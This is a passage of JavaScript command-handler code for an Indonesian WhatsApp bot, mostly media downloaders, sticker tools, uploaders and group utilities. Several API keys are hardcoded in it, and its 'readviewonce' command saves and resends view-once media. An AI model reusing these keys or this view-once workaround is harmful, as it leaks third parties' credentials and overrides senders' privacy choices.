const id = url.match(/(?:youtu\.be\/|youtube\.com\/(?:.*v=|.*\/|.*embed\/))([^&?/]+)/)?.[1];
let convertURL = init.convertURL + `&v=${id}&f=${format}&_=${Math.random()}`;
const converts = await fetch(convertURL, {headers});
const convert = await converts.json();
let info = {};
for (let i = 0; i < 3; i++ ){
    let j = await fetch(convert.progressURL, {headers});
    info = await j.json();
    console.log(info);
    if (info.progress == 3) break;
}
const result = {
    url: convert.downloadURL,
    title: info.title
}
await TamaMods.sendMessage(m.chat, { video: { url: result.url } }, { quoted: pantek });
} catch {
  Reply('aduh kak error nieh..')
}
}
break

//================================================================================

case "facebook": case "fb": {
if (!text) return example("linknya")
Reply(mess.wait)
var anu = await fetchJson(`https://restapi.simplebot.my.id/download/facebook?apikey=${global.apipayment}&url=${text}`)
if (anu.status) {
await TamaMods.sendMessage(m.chat, {video: {url: anu.result.media}, caption: "Sucessfully Download Facebook"}, {quoted: pantek})
} else {
return Reply("Error! Result Not Found")
}
}
break
//------(Batas Case)------//
case "mediafire": {   
    if (!text) return Reply(example("linknya"));
    if (!text.includes('mediafire.com')) return Reply("Link tautan tidak valid");

    // Endpoint Web API
    const apiUrl = `https://api.neoxr.eu/api/mediafire?url=${encodeURIComponent(text)}&apikey=zakkigans12`;

    try {
        const response = await fetch(apiUrl);
        const apiData = await response.json();

        // Validasi respons API
        if (!response.ok || !apiData.status || !apiData.data || !apiData.data.url) {
            return Reply("Error! Result Not Found");
        }

        // Ambil data dari hasil API
        const { title, size, mime, url } = apiData.data;

        // Pastikan URL file tersedia
        if (!url) {
            return Reply("Error! Link file tidak ditemukan dalam respons API.");
        }

        // Kirim file sebagai dokumen
        await TamaMods.sendMessage(m.chat, {
            document: { url },
            fileName: title || "MediaFire File",
            mimetype: mime || "application/octet-stream",
            caption: `📂 *Nama File:* ${title}\n📦 *Ukuran:* ${size}`
        }, { quoted: pantek });

    } catch (error) {
        console.error(error); // Logging error untuk debugging
        Reply("Error! Terjadi kesalahan saat mengunduh file.");
    }
}
break;

case "mediafire2":
 if (!text) return Reply("Masukkan link MediaFire yang ingin diunduh!");
 try {
 const response = await fetch('https://r.jina.ai/' + text, { 
 headers: { 'x-return-format': 'html' } 
 });
 if (!response.ok) throw new Error("Gagal mengambil data dari MediaFire!");
 const cheerio = require('cheerio');
 const textHtml = await response.text();
 const $ = cheerio.load(textHtml);
 const TimeMatch = $('div.DLExtraInfo-uploadLocation div.DLExtraInfo-sectionDetails')
 .text()
 .match(/This file was uploaded from (.*?) on (.*?) at (.*?)\n/);
 const fileSize = $('a#downloadButton').text().trim().split('\n')[0].trim();
 const result = {
 title: $('div.dl-btn-label').text().trim() || "Tidak diketahui",
 filename: $('div.dl-btn-label').attr('title') || "file",
 url: $('a#downloadButton').attr('href'),
 size: fileSize || "Tidak diketahui",
 from: TimeMatch?.[1] || "Tidak diketahui",
 date: TimeMatch?.[2] || "Tidak diketahui",
 time: TimeMatch?.[3] || "Tidak diketahui"
 };
 if (!result.url) throw new Error("Gagal mendapatkan link unduhan!");
 const caption = `✅ *Berhasil mengunduh file dari MediaFire!*\n\n`
 + `📂 *Nama File:* ${result.filename}\n`
 + `📦 *Ukuran:* ${result.size}\n`
 + `📅 *Tanggal Unggah:* ${result.date}\n`
 + `⏰ *Waktu Unggah:* ${result.time}\n`
 + `🌍 *Diupload dari:* ${result.from}\n\n`
 + `🔗 *Link:* ${result.url}`;
 Reply(mess.wait)
 await TamaMods.sendMessage(m.chat, { 
 document: { url: result.url },
 mimetype: 'application/octet-stream',
 fileName: result.filename,
 caption: caption
 }, { quoted: pantek });
 } catch (error) {
 Reply(`❌ *Gagal mengunduh file:* ${error.message}`);
 }
 break

//================================================================================

case "tiktokmp3": case "ttmp3": {
if (!text) return Reply(example("linknya"))
if (!text.startsWith('https://')) return Reply("Link tautan tidak valid")
await TamaMods.sendMessage(m.chat, {react: {text: '〽️', key: m.key}})
await Reply(mess.wait)
await tiktokDl(text).then(async (res) => {
if (!res.status) return Reply("Error! Result Not Found")
await TamaMods.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: pantek})
await TamaMods.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => Reply("Error! Result Not Found"))
}
break

//================================================================================

case "apkmod": {
if (!text) return Reply(example("capcut"))
await fetchJson(`https://restapi-v2.simplebot.my.id/search/happymod?q=${text}`).then((res) => {
let teks = ""
for (let i of res.result) {
teks += `\n* *Nama Apk :* ${i.name}
* *Link Download:* ${i.url}\n`
}
Reply(teks)
TamaMods.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(e => Reply("Error"))
}
break
//------(Batas Case)------//
case "capcut": {
if (!text) return Reply(example("linknya"))
if (!text.startsWith('https://')) return Reply("Link tautan tidak valid")
await fetchJson(`https://restapi-v2.simplebot.my.id/download/capcut?url=${text}`).then(async (res) => {
if (!res.status) return Reply("Error! Result Not Found")
await TamaMods.sendMessage(m.chat, {video: {url: res.result.videoUrl}, mimetype: "video/mp4", caption: "*Sucessfully Download Capcut*"}, {quoted: pantek})
}).catch((e) => Reply("Error"))
}
break
//------(Batas Case)------//
case "doodstream": case "dood": {
if (!text) return Reply(example("linknya"))
if (!text.startsWith('https://')) return Reply("Link tautan tidak valid")
try {
let res = await Buddy(`${text}`)
await TamaMods.sendMessage(m.chat, {video: {url: res.response.gif.url}, mimetype: "video/mp4", caption: "*Doodstream Downloader ✅*"}, {quoted: pantek})
} catch (err) {
console.log(err)
Reply("Error result not found")
}
}
break
//------(Batas Case)------//
case "googledrive": case "gdrive": {
if (!text) return Reply(example("linknya"))
if (!text.startsWith("https://")) return Reply(example("linknya"))
try {
    const res = await fetchJson(`https://restapi-v2.simplebot.my.id/download/gdrive?url=${text}`)
   await TamaMods.sendMessage(m.chat, { document: { url: res.result.downloadUrl }, mimetype: res.result.mimetype, fileName: `${res.result.fileName}`}, { quoted : m })
} catch (e) {
await Reply(`Error! result tidak ditemukan`)
}}
break
//------(Batas Case)------//
case "xnxxdl": {
if (!text) return Reply(example("linknya"))
if (!text.startsWith('https://')) return Reply("Link tautan tidak valid")
await fetchJson(`https://restapi-v2.simplebot.my.id/download/xnxx?url=${text}`).then(async (res) => {
if (!res.status) return Reply("Error! Result Not Found")
await TamaMods.sendMessage(m.chat, {video: {url: res.result.files.hight || res.result.files.low}, mimetype: "video/mp4", caption: "*Sucessfully Download XnXx*"}, {quoted: pantek})
}).catch((e) => Reply("Error"))
}
break

//================================================================================
case "svsc": {
if (!isCreator) return
if (!text || !text.endsWith(".zip")) return Reply(example("cpanel.zip & reply scnya"))
if (!/zip/.test(mime)) return Reply(example("cpanel.zip & reply scnya"))
if (!m.quoted) return Reply(example("cpanel & reply scnya"))
let ff = await m.quoted.download()
let nama = text
await fs.writeFileSync("./Access/database/savesc/"+nama, ff)
return Reply(`Berhasil menyimpan script *${nama}.zip*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "daftarsc": {
if (!isCreator) return
let scnya = await fs.readdirSync("./Access/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return Reply("Tidak ada script tersimpan")
let teks = ""
for (let e of scnya) {
teks += e + "\n"
}
Reply(teks)
}
break
//------(Batas Case)------//
case "readqr": {
if (!/image|video/.test(mime)) return Reply(example("dengan reply qris"))
const Jimp = require("jimp");
const QrCode = require("qrcode-reader");
async function readQRISFromBuffer(buffer) {
    return new Promise(async (resolve, reject) => {
        try {
            const image = await Jimp.read(buffer);
            const qr = new QrCode();
            qr.callback = (err, value) => {
                if (err) return reject(err);
                resolve(value ? value.result : null);
            };
            qr.decode(image.bitmap);
        } catch (error) {
            reject(error);
        }
    });
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await readQRISFromBuffer(aa)
await TamaMods.sendMessage(m.chat, {text: `*Data :*\n${dd}`}, {quoted: pantek})
}
break
//------(Batas Case)------//
case "hapussc": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./Access/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return Reply("Tidak ada script tersimpan")
if (!text) return Reply(example("namasc"))
let namasc = text
namasc = namasc.toLowerCase()
if (!scnya.includes(namasc)) return Reply('Nama script tidak ditemukan')
await fs.unlinkSync("./Access/database/savesc/"+namasc)
Reply(`Berhasil menghapus script *${namasc}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sendsc": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./Access/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return Reply("Tidak ada script tersimpan")
if (!text) return Reply(example("namasc|628××"))
if (!text.split("|'")) return Reply(example("namasc|628××"))
const input = m.mentionedJid[0] ? m.mentionedJid[0] : text.split("|")[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net"
var onWa = await TamaMods.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return Reply("Nomor tidak terdaftar di whatsapp")
let namasc = text.split("|")[0]
namasc = namasc.toLowerCase()
if (!scnya.includes(namasc)) return Reply('Nama script tidak ditemukan')
await TamaMods.sendMessage(input, {document: fs.readFileSync("./Access/database/savesc/"+namasc), fileName: namasc, mimetype: "application/zip", caption: `Script ${namasc}`}, {quoted: pantek})
Reply(`Berhasil mengirim script *${namasc}* ke ${input.split("@")[0]}`)
}
break
//------(Batas Case)------//
case 'instagram': case 'igdl': case 'ig': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
	  if (!text) return Reply(`Anda perlu memberikan URL video, postingan, reel, gambar Instagram apa pun`)
	  Reply(mess.wait)
	  TamaMods.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
 try {
    const data = await fetchJson(`https://api.ryzendesu.vip/api/downloader/igdl?url=${encodeURIComponent(text)}`);
if (data && data.data && data.data.length > 0 && data.data[0].url) {
    const hasil = data.data[0].url;
    const cap = `ini dia kak🔥`;
    TamaMods.sendMessage(m.chat, { video: { url: hasil }, caption: cap }, { quoted: pantek });
}
} catch (error) {
    console.error(error);
    const cap = `Maaf, videonya nggak bisa diambil. Ini gambar yang tersedia:`;
    TamaMods.sendMessage(m.chat, { image: {url: hasil}, caption: cap}, {quoted: pantek});
}
}
break



case "terabox": {
if (!text) return Reply(example("linknya"))
if (!text.startsWith('https://')) return Reply("Link tautan tidak valid")
await fetchJson(`https://restapi-v2.simplebot.my.id/download/terabox?url=${text}`).then(async (res) => {
if (!res.status) return Reply("Error! Result Not Found")
await TamaMods.sendMessage(m.chat, {document: {url: res.result}, mimetype: "application/zip", fileName: "Terabox.zip", caption: "*Terabox Downloader ✅*"}, {quoted: pantek})

}).catch((e) => Reply("Error link tautan tidak didukung"))
}
break
//------(Batas Case)------//
case "spotify": {
if (!text) return Reply(example("linknya"))
if (!text.startsWith('https://')) return Reply("Link tautan tidak valid")
await fetchJson(`https://restapi.simplebot.my.id/api/download/spotify?url=${text}`).then(async (res) => {
if (!res.status) return Reply("Error! Result Not Found")
await TamaMods.sendMessage(m.chat, {audio: {url: res.result}, mimetype: "audio/mpeg"}, {quoted: pantek})
}).catch((e) => Reply("Error"))
}
break
//------(Batas Case)------//
case "playspotify": case "plays": case "playsp": {
if (!text) return Reply(example("last child"))
await TamaMods.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})

var anu = await fetchJson(`https://restapi-v2.simplebot.my.id/download/playspotify?q=${text}`)

if (anu.result.metadata.link) {
let urlMp3 = anu.result.metadata.link
await TamaMods.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: anu.result.metadata.cover_url, title: anu.result.metadata.title, body: `Author ${anu.result.metadata.artists} || Duration ${anu.result.metadata.duration}`, sourceUrl: anu.result.metadata.link, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: pantek})
} else {
return Reply("Error! vidio atau lagu tidak ditemukan")
}
}
break

//================================================================================

case "gitclone": {
if (!text) return Reply(example("https://github.com/TamaModsdev"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return Reply("Link tautan tidak valid")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    TamaMods.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await Reply(`Error! Repositori Tidak Ditemukan`)
}}
break

//================================================================================


//================================================================================

case "ssweb": {
if (!text) return Reply(example("https://example.com"))
if (!isUrl(text)) return Reply(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await TamaMods.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: pantek})
}
break

//================================================================================



//================================================================================

case "idgc": case "cekidgc": {
if (!m.isGroup) return Reply(mess.group)
Reply(m.chat)
}
break

//================================================================================

case "listgc": case "listgrup": {
if (!isCreator) return
let teks = `\n *List all group chat*\n`
let a = await TamaMods.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return Reply(teks)
}
break

//================================================================================

case "shortlink": case "shorturl": {
if (!text) return Reply(example("https://example.com"))
if (!isUrl(text)) return Reply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return Reply(link)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shortlink2": {
if (!text) return Reply(example("https://example.com"))
if (!isUrl(text)) return Reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await TamaMods.sendMessage(m.chat, {text: a.url}, {quoted: pantek})
}
break
//------(Batas Case)------//
case "cekidch": case "idch": {
if (!text && !m.quoted) return Reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return Reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await TamaMods.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy ID Channel\",\"id\":\"123456789\",\"copy_code\":\"${res.id}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: pantek})
await TamaMods.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break


//================================================================================

case "pin": case "pinterest": {
if (!text) return Reply(example("anime dark"))
await TamaMods.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: TamaMods.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: pantek})
await TamaMods.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

//================================================================================

case 'brat1': {
const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
  
  if (!quo) return Reply('*masukan teksnya*');
  
async function brat(text) {
  try {
    return await new Promise((resolve, reject) => {
      if(!text) return reject("missing text input");
      axios.get("https://brat.caliphdev.com/api/brat", {
        params: {
          text
        },
        responseType: "arraybuffer"
      }).then(res => {
        const image = Buffer.from(res.data);
        if(image.length <= 10240) return reject("failed generate brat");
        return resolve({
          success: true, 
          image
        })
      })
    })
  } catch (e) {
    return {
      success: false,
      errors: e
    }
  }
}

const buf = await brat(quo);
await TamaMods.sendAsSticker(m.chat, buf.image, m, { packname: global.packname, author: global.author })
}
break
//------(Batas Case)------//
case 'furbrat': {
  if(!text) return Reply('masukan text nya ler')
  TamaMods.sendAsSticker(from, `https://fastrestapis.fasturl.link/tool/furbrat?text=${encodeURIComponent(text)}`, m, { packname: global.packname, author: global.author})
}
break
//------(Batas Case)------//
case "bratvid": case "bratvideo":{
    if (!text) return Reply(example('teksnya'))
        TamaMods.sendMessage(m.chat, { react: { text: `〽️`, key: m.key }})
    try {
        let brat = `https://fgsi1-brat.hf.space/?text=${encodeURIComponent(text)}&isVideo=true`;
        let response = await axios.get(brat, { responseType: "arraybuffer" });
        let videoBuffer = response.data;
        let stickerBuffer = await TamaMods.sendAsSticker(m.chat, videoBuffer, m, {
            packname: global.packname,
            author: global.author,
        });
        console.log("Stiker berhasil dibuat:", stickerBuffer);
    } catch (err) {
        console.error("Error:", err);
        Reply("Maaf, terjadi kesalahan saat mencoba membuat stiker video. Silakan coba lagi.");
    }
}
break;

case "emojigif": {
if (!text) return Reply(example('😅'))
try {
let brat = `https://restapi-v2.simplebot.my.id/tools/emojitogif?emoji=${encodeURIComponent(text)}`;
let response = await axios.get(brat, { responseType: "arraybuffer" });
let videoBuffer = response.data;
let stickerBuffer = await TamaMods.sendAsSticker(m.chat, videoBuffer, m, {
packname: global.packname,
})
} catch (err) {
console.error("Error:", err);
}
}
break
//------(Batas Case)------//
case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) return Reply(`Example : ${prefix+command} 😅+🤔`)
		if (!emoji2) return Reply(`Example : ${prefix+command} 😅+🤔`)
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await TamaMods.sendAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.namaowner, categories: res.tags })
		    
		}
	    }
	    break

//================================================================================

case "qc": {
if (!text) return Reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await TamaMods.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./Access/database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return Reply("Error")
await TamaMods.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

//================================================================================

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return Reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return Reply("Durasi vidio maksimal 15 detik!")
var image = await TamaMods.downloadAndSaveMediaMessage(qmsg)
await TamaMods.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

//================================================================================

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return Reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return Reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return Reply("Durasi vidio maksimal 15 detik!")
var image = await TamaMods.downloadAndSaveMediaMessage(qmsg)
await TamaMods.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

//================================================================================

case "rvo": case "readviewonce": {
if (!m.quoted) return Reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return Reply("Pesan itu bukan viewonce!")
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return TamaMods.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: pantek})
    } else if (/image/.test(type)) {
        return TamaMods.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: pantek})
    } else if (/audio/.test(type)) {
        return TamaMods.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: pantek})
    } 
}
break

//================================================================================

case "tourl": {
				if (!/video/.test(mime) && !/image/.test(mime)) return Reply(`*Send/Reply the Video/Image With Caption* ${prefix + command}`)
				if (!quoted) return Reply(`*Send/Reply the Video/Image Caption* ${prefix + command}`)
				let q = m.quoted ? m.quoted : m
				TamaMods.sendMessage(m.chat, { react: { text: `〽️`, key: m.key }})
				let media = await q.download()
				let uploadImage = require('../Access/uploadImage')
				let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
				let link = await (isTele ? uploadImage : uploadFile)(media)
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								contextInfo: {
									mentionedJid: [m.sender],
									isForwarded: true,
									forwardedNewsletterMessageInfo: {
										newsletterJid: global.idSaluran,
										newsletterName: '𝑻𝒂𝒎𝒂 3𝒔𝒄𝒂𝒏𝒏𝒐𝒓',
										serverMessageId: -1
									},
									businessMessageForwardInfo: {
										businessOwnerJid: TamaMods.decodeJid(TamaMods.user.id)
									},
								},
								body: proto.Message.InteractiveMessage.Body.create({
									text: link
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: global.generasi,
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									title: `Hi, @${m.sender.split("@")[0]} Here is Your CatBox Link!\n`,
									subtitle: "Simple Bot V2",
									hasMediaAttachment: true,
									...(await prepareWAMessageMedia({
										image: {
											url: `${link}`
										}
									}, {
										upload: TamaMods.waUploadToServer
									}))
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [{
										"name": "cta_copy",
										"buttonParamsJson": `{\"display_text\":\"Copy Link\",\"id\":\"123456789\",\"copy_code\":\"${link}\"}`
									}, ],
								})
							})
						}
					}
				}, {})

				await TamaMods.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				}, {
					quoted: pantek
				})

			}
			break
			case "tourlvid": case "tourlvideo": {
				if (!/video/.test(mime) && !/image/.test(mime)) return Reply(`*Send/Reply the Video/Image With Caption* ${prefix + command}`)
				if (!quoted) return Reply(`*Send/Reply the Video/Image Caption* ${prefix + command}`)
				let q = m.quoted ? m.quoted : m
				TamaMods.sendMessage(m.chat, { react: { text: `〽️`, key: m.key }})
				let media = await q.download()
				let uploadImage = require('../Access/uploadImage')
				let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
				let link = await (isTele ? uploadImage : uploadFile)(media)
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								contextInfo: {
									mentionedJid: [m.sender],
									isForwarded: true,
									forwardedNewsletterMessageInfo: {
										newsletterJid: global.idSaluran,
										newsletterName: '𝑻𝒂𝒎𝒂 3𝒔𝒄𝒂𝒏𝒏𝒐𝒓',
										serverMessageId: -1
									},
									businessMessageForwardInfo: {
										businessOwnerJid: TamaMods.decodeJid(TamaMods.user.id)
									},
								},
								body: proto.Message.InteractiveMessage.Body.create({
									text: link
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: global.generasi,
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									title: `Hi, @${m.sender.split("@")[0]} Here Is Your CatBox Link!\n`,
									subtitle: "Simple Bot V2",
									hasMediaAttachment: true,
									...(await prepareWAMessageMedia({
										video: {
											url: `${link}`
										}
									}, {
										upload: TamaMods.waUploadToServer
									}))
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [{
										"name": "cta_copy",
										"buttonParamsJson": `{\"display_text\":\"Copy Link\",\"id\":\"123456789\",\"copy_code\":\"${link}\"}`
									}, ],
								})
							})
						}
					}
				}, {})

				await TamaMods.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				}, {
					quoted: pantek
				})

			}
			break



case "tourl2": {
if (!/image/.test(mime)) return Reply(example("dengan kirim/reply foto"))
let media = await TamaMods.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'TamaMods.png');

let teks = `
 *Size media :* ${await getSizeMedia(directLink)}
 *Upload service :* pixhost.to
 *Expired link :* Tidak ada expired.`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Url Media\",\"id\":\"123456789\",\"copy_code\":\"${directLink}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: pantek})
await TamaMods.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
await fs.unlinkSync(media)
}
break


//================================================================================

case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return Reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return Reply(example("id good night"))
if (args.length < 1) return Reply(example("id good night"))
if (!m.quoted.text) return Reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
Reply(result[0])
}
} else {
return Reply(example("id good night"))
}}
break

//================================================================================

case 'remini': case 'hd': case 'tohd': {
if (!/image/.test(mime)) return example("dengan kirim/reply foto")
Reply(mess.wait)
const FormData = require('form-data');
const { fromBuffer } = require('file-type');
async function getUrls (buffer) {
  let { ext } = await fromBuffer(buffer);
  let bodyForm = new FormData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");
  let res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm,
  });
  let data = await res.text();
  return data;
}
let media = await TamaMods.downloadAndSaveMediaMessage(qmsg)
let directLink = await getUrls(fs.readFileSync(media))
try {
const apa = await fetchJson(`https://api.neoxr.eu/api/remini?image=${directLink}&apikey=zakkigans12`)
await TamaMods.sendMessage(m.chat, {image: {url: apa.data.url}, caption: mess.done}, {quoted: pantek})
} catch (err) {
await Reply("Error: " + err)
}
await fs.unlinkSync(media)
}
break 

//================================================================================

case "add": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await TamaMods.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return Reply("Nomor tidak terdaftar di whatsapp")
const res = await TamaMods.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return Reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return Reply(JSON.stringify(res, null, 2))
}} else {
